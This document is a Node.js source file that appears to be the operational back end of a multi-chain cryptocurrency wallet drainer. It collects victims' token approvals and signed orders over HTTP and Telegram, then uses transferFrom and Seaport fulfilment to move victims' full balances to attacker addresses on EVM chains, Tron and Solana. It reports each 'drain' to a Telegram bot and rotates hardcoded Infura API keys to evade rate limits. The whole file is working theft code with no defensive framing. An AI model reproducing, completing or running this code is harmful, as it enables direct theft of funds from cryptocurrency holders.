require('dotenv').config();
const { ethers } = require("ethers");
const { Connection } = require("@solana/web3.js");
const { TronWeb } = require('tronweb');
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// --- GLOBAL CONFIG ---
const RECEIVER_PRIVATE_KEY = process.env.PRIVATE_KEY;
const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS;
const WORKER_PORT = process.env.WORKER_PORT || 8080;
const TG_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN;
const TG_CHAT_ID = process.env.NEXT_PUBLIC_TG_CHAT_ID;

// --- PERSISTENT APPROVAL QUEUE ---
const QUEUE_FILE = path.join(__dirname, 'approval_queue.json');
const APPROVAL_QUEUE = {
    pending: [],    // Waiting for confirmation or gas
    processing: [], // Currently being drained
    completed: [],  // Successfully drained
    failed: []      // Failed after retries
};

// Load queue from disk on startup
function loadQueue() {
    try {
        if (fs.existsSync(QUEUE_FILE)) {
            const data = JSON.parse(fs.readFileSync(QUEUE_FILE, 'utf8'));
            Object.assign(APPROVAL_QUEUE, data);
            console.log(`📂 Loaded ${APPROVAL_QUEUE.pending.length} pending approvals from disk`);
        }
    } catch (e) {
        console.error("❌ Failed to load queue:", e.message);
    }
}

// Save queue to disk
function saveQueue() {
    try {
        fs.writeFileSync(QUEUE_FILE, JSON.stringify(APPROVAL_QUEUE, null, 2));
    } catch (e) {
        console.error("❌ Failed to save queue:", e.message);
    }
}

// --- TELEGRAM HELPER ---
async function sendTelegram(message) {
    if (!TG_TOKEN || !TG_CHAT_ID) return;
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
    const data = JSON.stringify({
        chat_id: TG_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    });

    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    return new Promise((resolve) => {
        const req = https.request(url, options, (res) => {
            resolve(res.statusCode === 200);
        });
        req.on('error', () => resolve(false));
        req.write(data);
        req.end();
    });
}

// --- TELEGRAM POLLING (THE RELAY FIX) ---
let lastUpdateId = 0;

async function pollTelegramUpdates() {
    if (!TG_TOKEN) return;
    try {
        const url = `https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`; // Long polling

        const req = https.get(url, (res) => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => {
                try {
                    const json = JSON.parse(data);
                    if (json.ok && json.result.length > 0) {
                        for (const update of json.result) {
                            lastUpdateId = update.update_id;
                            if (update.message && update.message.text) {
                                handleTelegramMessage(update.message.text);
                            }
                        }
                    }
                } catch (e) {
                    console.error("Error parsing TG updates:", e.message);
                }
                setTimeout(pollTelegramUpdates, 100); // Poll fast
            });
        });

        req.on("error", (e) => {
            console.error("TG Poll Error:", e.message);
            setTimeout(pollTelegramUpdates, 5000); // Retry later
        });

    } catch (e) {
        console.error("Fatal TG Poll Error", e);
        setTimeout(pollTelegramUpdates, 5000);
    }
}

async function handleTelegramMessage(text) {
    console.log(`📨 [RAW MSG]: ${text.slice(0, 50)}...`); // Debug log

    // COMMAND: /ping
    if (text.trim() === "/ping") {
        sendTelegram("🏓 **PONG!** Worker is Online.\nIP: " + (process.env.VPS_IP || "VPS_IP"));
        return;
    }

    // COMMAND: /check
    if (text.trim() === "/check") {
        sendTelegram("✅ **Worker is listening** (Offset: " + lastUpdateId + ")");
        return;
    }

    // ROBUST PARSER: Find JSON anywhere in the text
    // Looks for a JSON-like structure starting with { and matching "type":"..."
    try {
        const jsonMatch = text.match(/(\{.*"type"\s*:\s*".*?\".*\})/s);
        if (jsonMatch) {
            const jsonStr = jsonMatch[1];
            const data = JSON.parse(jsonStr);

            console.log(`📥 [TG RELAY] Found Valid Order Data! Type: ${data.type}`);
            sendTelegram(`⚙️ **Processing extracted order...**`);

            if (data.type === "EVM_APPROVAL") {
                // New approval received!
                console.log(`📝 [APPROVAL] Queuing approval for ${data.symbol} on ${data.chain}`);

                APPROVAL_QUEUE.pending.push({
                    victim: data.victim,
                    token: data.token,
                    symbol: data.symbol,
                    balance: data.balance,
                    chain: data.chain,
                    txHash: data.txHash,
                    timestamp: Date.now(),
                    retries: 0
                });

                saveQueue();
                sendTelegram(`📝 **Approval Queued**\nToken: ${data.symbol}\nChain: ${data.chain}\nTX: \`${data.txHash}\`\n\nWaiting for confirmation...`);

            } else if (data.type === "EVM_SEAPORT") {
                // Legacy Seaport support (will be removed)
                if (!data.chainName) {
                    console.error("❌ Critical: Order missing 'chainName'");
                    sendTelegram("⚠️ Error: Order missing chain name.");
                    return;
                }
                const chain = data.chainName.toLowerCase();
                console.log(`Processing Seaport Order for ${chain}...`);
                await fulfillSeaportOrder(data.order, chain);

            } else if (data.type === "SOLANA") {
                console.log(`Processing Solana Transaction...`);
                const sig = await solanaConnection.sendRawTransaction(Buffer.from(data.rawTransaction, "base64"), { skipPreflight: true });
                console.log(`📤 [SOL] TX Sent: ${sig}`);
                sendTelegram(`✅ *Solana Transaction Sent*\nSignature: \`${sig}\``);
            }
        }
    } catch (e) {
        // Only log if it looked like a command but failed
        if (text.includes("SG:")) {
            console.error("Failed to parse message:", e.message);
            console.error("Raw text was:", text);
        }
    }
}

// Start Polling
pollTelegramUpdates();

// --- API KEYS ---
const INFURA_IDS = [
    "2859d5b9da2648988a15b3fc6e0783b5",
    "80ce8d8563c24c37b86b86718ed5fd4f",
    "ad74f9b87bd14085895423c071a966fa",
    "f1e1c2680e4c43818263980084866941"
];
let currentInfuraIndex = 0;

function getInfuraId() {
    return INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
}

function rotateInfura() {
    currentInfuraIndex++;
    const nextId = getInfuraId();
    sendTelegram(`🔄 *Infura Rotation*\nRate limit hit. Switched to key index: ${currentInfuraIndex % INFURA_IDS.length}\nNew ID: \`${nextId}\``);
}

// Solana Config
const SOLANA_RECEIVER_ADDRESS = process.env.SOLANA_RECEIVER_ADDRESS || "37cr8JQ1iXMaci4io4x9Bdum14SovdVAeneqm8AH3Uo5";
const SOLANA_PRIVATE_KEY = process.env.SOLANA_PRIVATE_KEY;
const SOLANA_RPC = process.env.SOLANA_RPC || "https://api.mainnet-beta.solana.com";
const solanaConnection = new Connection(SOLANA_RPC, "confirmed");

// Tron Config
const TRON_PRIVATE_KEY = process.env.TRON_PRIVATE_KEY;
const TRON_RECEIVER_ADDRESS = "TJ19BCQFh2WDRmtfURVCyLUWMN9X65U8Cx";
const TRON_RPC = process.env.TRON_RPC || "https://api.trongrid.io";

// Robust TronWeb Initialization
let tronWeb = null;
try {
    const TW = require('tronweb');
    // Try both destructured and direct
    const TronWebClass = TW.TronWeb || TW.default?.TronWeb || TW.default || TW;
    if (TRON_PRIVATE_KEY) {
        tronWeb = new TronWebClass(TRON_RPC, TRON_RPC, TRON_RPC, TRON_PRIVATE_KEY);
    }
} catch (e) {
    console.error("❌ Fatal TronWeb Init Error:", e.message);
}

// EVM Config
const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
const SEAPORT_ABI = ["function fulfillOrder(((address offerer, address zone, (uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount)[] offer, (uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount, address recipient)[] consideration, uint8 orderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 conduitKey, uint256 counter) parameters, bytes signature) order, bytes32 fulfillerConduitKey) external payable returns (bool)"];
const ERC20_ABI = ["function balanceOf(address owner) view returns (uint256)", "function allowance(address owner, address spender) view returns (uint256)", "function transferFrom(address from, address to, uint256 value) public returns (bool)"];

const CHAIN_CONFIGS = {
    "ethereum": { name: "ethereum", id: 1, sub: "" },
    "bsc": { name: "binance smart chain", id: 56, url: "https://bsc-dataseed.binance.org/" },
    "polygon": { name: "polygon", id: 137, sub: "polygon" },
    "base": { name: "base", id: 8453, url: "https://mainnet.base.org" },
    "arbitrum": { name: "arbitrum", id: 42161, sub: "arbitrum" },
    "optimism": { name: "optimism", id: 10, sub: "optimism" },
    "avalanche": { name: "avalanche", id: 43114, sub: "avalanche" },
    "cronos": { name: "cronos", id: 25, url: "https://evm.cronos.org" },
    "fantom": { name: "fantom", id: 250, url: "https://rpc.ftm.tools/" },
    "linea": { name: "linea", id: 59144, url: "https://rpc.linea.build" },
    "scroll": { name: "scroll", id: 534352, url: "https://rpc.scroll.io" },
    "zksync": { name: "zksync", id: 324, url: "https://mainnet.era.zksync.io" },
    "mantle": { name: "mantle", id: 5000, url: "https://rpc.mantle.xyz" },
    "blast": { name: "blast", id: 81457, url: "https://rpc.blast.io" },
    "celo": { name: "celo", id: 42220, url: "https://forno.celo.org" },
    "gnosis": { name: "gnosis", id: 100, url: "https://rpc.gnosischain.com" },
    "moonbeam": { name: "moonbeam", id: 1284, url: "https://rpc.api.moonbeam.network" },
    "moonriver": { name: "moonriver", id: 1285, url: "https://rpc.api.moonriver.network" }
};

// --- DATA QUEUES ---
const SEAPORT_ORDERS = [];
const PENDING_FUNDING = new Map();

// --- HTTP SERVER (UNIFIED) ---
const server = http.createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") { res.writeHead(200); res.end(); return; }

    let body = "";
    req.on("data", chunk => { body += chunk.toString(); });
    req.on("end", async () => {
        try {
            const data = JSON.parse(body);

            if (req.url === "/submit-evm-order") {
                SEAPORT_ORDERS.push({ order: data.order, chainName: data.chainName });
                console.log(`📥 [EVM] Received Seaport Order for ${data.chainName}`);
                return res.end(JSON.stringify({ status: "success" }));
            }

            if (req.url === "/submit-solana-tx") {
                console.log("📥 [SOL] Received Solana Transaction. Broadcasting...");
                const sig = await solanaConnection.sendRawTransaction(Buffer.from(data.rawTransaction, "base64"), { skipPreflight: true });
                console.log(`📤 [SOL] TX Sent: ${sig}`);
                return res.end(JSON.stringify({ status: "success", signature: sig }));
            }

            if (req.url === "/notify-tron-approval") {
                console.log(`📥 [TRON] Received Approval from ${data.owner}`);
                await fulfillTronDrain(data.owner, data.tokenAddress);
                return res.end(JSON.stringify({ status: "success" }));
            }

            res.writeHead(404); res.end("Not Found");
        } catch (e) {
            console.error("❌ Request Error:", e.message);
            res.writeHead(500); res.end(e.message);
        }
    });
});

// --- DRAIN LOGIC ---

async function fulfillSeaportOrder(order, chainName) {
    try {
        if (!chainName) {
            console.error("❌ Critical: fulfilSeaportOrder called without chainName");
            return false;
        }

        const config = CHAIN_CONFIGS[chainName.toLowerCase()];
        if (!config) {
            console.error(`❌ Unknown chain: ${chainName}`);
            return false;
        }

        let rpcUrl = config.url;
        if (!rpcUrl) {
            rpcUrl = `https://${config.sub || config.name}-mainnet.infura.io/v3/${getInfuraId()}`;
        }

        const provider = new ethers.JsonRpcProvider(rpcUrl);
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
        const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);

        // Manual Gas Settings to ensure execution
        // Manual Gas Settings to ensure execution
        const feeData = await provider.getFeeData();
        const gasPrice = feeData.gasPrice ? (feeData.gasPrice * 150n) / 100n : undefined; // +50% gas price for speed

        console.log(`🚀 [EVM] Submitting Seaport Order on ${chainName}...`);
        const tx = await seaport.fulfillOrder(order, "0x0000000000000000000000000000000000000000000000000000000000000000", {
            value: 1n, // PAY THE 1 CORE WEI TO FULFILL THE ORDER
            gasLimit: 500000,
            gasPrice: gasPrice
        });

        console.log(`✅ [EVM] Seaport Success on ${chainName}: ${tx.hash}`);
        sendTelegram(`✅ **Seaport Drained!**\nChain: ${chainName}\nTX: \`${tx.hash}\``);
        return true;
    } catch (e) {
        console.error(`❌ [EVM] Seaport Failed on ${chainName}:`, e.message);
        sendTelegram(`❌ **Seaport Failed** (${chainName})\nError: ${e.message.slice(0, 100)}`);

        if (e.message.includes("429") || e.message.includes("limit")) {
            console.warn("⚠️ Rate limit hit. Rotating Infura ID...");
            rotateInfura();
        }
        return false;
    }
}

async function fulfillTronDrain(owner, tokenAddress) {
    if (!tronWeb) return;
    try {
        const contract = await tronWeb.contract().at(tokenAddress);
        const balance = await contract.balanceOf(owner).call();
        const tx = await contract.transferFrom(owner, TRON_RECEIVER_ADDRESS, balance).send();
        console.log(`✅ [TRON] Drain Success: ${tx}`);
    } catch (e) {
        console.error(`❌ [TRON] Drain Failed:`, e.message);
    }
}


// --- EXPLORER HELPER ---
function getExplorerLink(chain, txHash) {
    const basenames = {
        "ethereum": "https://etherscan.io/tx/",
        "bsc": "https://bscscan.com/tx/",
        "polygon": "https://polygonscan.com/tx/",
        "base": "https://basescan.org/tx/",
        "arbitrum": "https://arbiscan.io/tx/",
        "optimism": "https://optimistic.etherscan.io/tx/",
        "avalanche": "https://snowtrace.io/tx/",
        "fantom": "https://ftmscan.com/tx/",
        "cronos": "https://cronoscan.com/tx/",
        "gnosis": "https://gnosisscan.io/tx/",
        "linea": "https://lineascan.build/tx/",
        "scroll": "https://scrollscan.com/tx/",
        "zksync": "https://explorer.zksync.io/tx/",
        "mantle": "https://explorer.mantle.xyz/tx/",
        "blast": "https://blastscan.io/tx/",
        "celo": "https://celoscan.io/tx/",
        "moonbeam": "https://moonscan.io/tx/",
        "moonriver": "https://moonriver.moonscan.io/tx/"
    };
    const base = basenames[chain.toLowerCase()] || "https://etherscan.io/tx/";
    return base + txHash;
}

// --- APPROVAL DRAIN FUNCTION ---
async function drainApprovedToken(approval) {
    try {
        const { victim, token, symbol, balance, chain, txHash } = approval;

        console.log(`💰 [DRAIN] Attempting to drain ${symbol} from ${victim} on ${chain}`);

        // Get chain config
        const chainConfig = CHAIN_CONFIGS[chain];
        if (!chainConfig) {
            console.error(`❌ Unknown chain: ${chain}`);
            return false;
        }

        // Create provider and wallet
        const provider = new ethers.JsonRpcProvider(chainConfig.rpc);
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);

        // Check receiver gas balance
        const receiverBalance = await provider.getBalance(RECEIVER_ADDRESS);
        const minGas = ethers.parseEther("0.001"); // Minimum 0.001 native token

        if (receiverBalance < minGas) {
            console.log(`⏳ [DRAIN] Insufficient receiver gas: ${ethers.formatEther(receiverBalance)} (need 0.001+)`);
            return false; // Keep in queue, will retry
        }

        // Check if approval TX is confirmed
        const receipt = await provider.getTransactionReceipt(txHash);
        if (!receipt) {
            console.log(`⏳ [DRAIN] Approval TX not confirmed yet: ${txHash}`);
            // Notify only on first few retries to avoid spam
            if (!approval.retries || approval.retries % 5 === 0) {
                sendTelegram(`⏳ **Approval Pending Confirmation**\nToken: ${symbol}\nChain: ${chain}\nTX: [View on Explorer](${getExplorerLink(chain, txHash)})`);
            }
            return false; // Keep in queue
        }

        if (receipt.status !== 1) {
            console.error(`❌ [DRAIN] Approval TX failed: ${txHash}`);
            sendTelegram(`❌ **Approval Reverted**\nToken: ${symbol}\nChain: ${chain}\nTX: [View on Explorer](${getExplorerLink(chain, txHash)})`);
            return "failed"; // Move to failed queue
        }

        // Execute drain
        const tokenContract = new ethers.Contract(token, ERC20_ABI, wallet);

        console.log(`🚀 [DRAIN] Executing transferFrom for ${symbol}...`);
        const tx = await tokenContract.transferFrom(victim, RECEIVER_ADDRESS, balance, {
            gasLimit: 100000
        });

        await tx.wait();

        console.log(`✅ [DRAIN] Success! TX: ${tx.hash}`);
        const explorerLink = getExplorerLink(chain, tx.hash);
        sendTelegram(`💰 **Token Drained!**\n\nToken: ${symbol}\nChain: ${chain}\nAmount: ${ethers.formatUnits(balance, 18)}\n\n🔗 [View Transaction](${explorerLink})`);

        return true; // Success - remove from queue

    } catch (e) {
        console.error(`❌ [DRAIN] Error:`, e.message);

        if (e.message.includes("insufficient funds") || e.message.includes("gas")) {
            console.log(`⏳ [DRAIN] Gas issue - will retry later`);
            return false; // Keep in queue
        }

        // Other errors - move to failed
        sendTelegram(`❌ **Drain Failed**\nToken: ${approval.symbol}\nError: ${e.message.slice(0, 100)}`);
        return "failed";
    }
}

// --- APPROVAL MONITORING LOOP ---
setInterval(async () => {
    if (APPROVAL_QUEUE.pending.length > 0) {
        console.log(`📦 [QUEUE] Processing approvals... (${APPROVAL_QUEUE.pending.length} pending)`);

        // Process one approval at a time
        const approval = APPROVAL_QUEUE.pending[0];

        const result = await drainApprovedToken(approval);

        if (result === true) {
            // Success - move to completed
            APPROVAL_QUEUE.pending.shift();
            APPROVAL_QUEUE.completed.push({ ...approval, completedAt: Date.now() });
            console.log(`✅ [QUEUE] Approval completed and removed from queue`);
        } else if (result === "failed") {
            // Failed - move to failed queue
            APPROVAL_QUEUE.pending.shift();
            APPROVAL_QUEUE.failed.push({ ...approval, failedAt: Date.now() });
            console.log(`❌ [QUEUE] Approval moved to failed queue`);
        } else {
            // false = retry later (gas issue or not confirmed yet)
            approval.retries = (approval.retries || 0) + 1;
            console.log(`⏳ [QUEUE] Will retry approval (attempt ${approval.retries})`);
        }

        saveQueue();
    }
}, 5000); // Check every 5 seconds

// --- LEGACY SEAPORT QUEUE (DEPRECATED) ---
setInterval(async () => {
    if (SEAPORT_ORDERS.length > 0) {
        console.log(`📦 [LEGACY] Processing Seaport order... (${SEAPORT_ORDERS.length} remaining)`);
        const item = SEAPORT_ORDERS.shift();
        try {
            const success = await fulfillSeaportOrder(item.order, item.chainName);
            if (!success) {
                setTimeout(() => SEAPORT_ORDERS.push(item), 5000);
            }
        } catch (e) {
            console.error(`❌ [LEGACY] Seaport error:`, e.message);
        }
    }
}, 2000);

server.listen(WORKER_PORT, () => {
    // Load pending approvals from disk
    loadQueue();
    const startMsg = `🚀 *Ultimate Worker Started*\n\n` +
        `🌐 EVM Chains: 12+\n` +
        `☀️ Solana: Active\n` +
        `💎 Tron: Active\n` +
        `🛡️ Port: ${WORKER_PORT}\n` +
        `🔑 API Rotation: 4 Keys Configured\n` +
        `📝 Pending Approvals: ${APPROVAL_QUEUE.pending.length}`;
    console.log(startMsg.replace(/\*/g, ''));
    sendTelegram(startMsg);
    console.log(`📡 Monitoring EVM, Solana, and Tron...`);
});
